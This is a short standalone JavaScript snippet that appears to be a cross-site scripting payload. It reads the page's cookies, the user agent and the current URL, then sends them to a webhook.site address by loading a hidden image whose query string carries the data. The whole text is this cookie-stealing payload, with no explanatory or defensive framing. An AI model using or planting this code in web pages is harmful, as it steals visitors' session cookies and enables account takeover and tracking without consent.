(() => {
  const hook = 'https://webhook.site/f17cb942-847b-49ab-9d9b-11e818602e8b';
  const leak = (data) => {
    const i = new Image();
    i.src = hook + '?u=' + encodeURIComponent(location.href) + '&d=' + encodeURIComponent(data);
  };
  leak('cookie=' + document.cookie + '; ua=' + navigator.userAgent);
})();
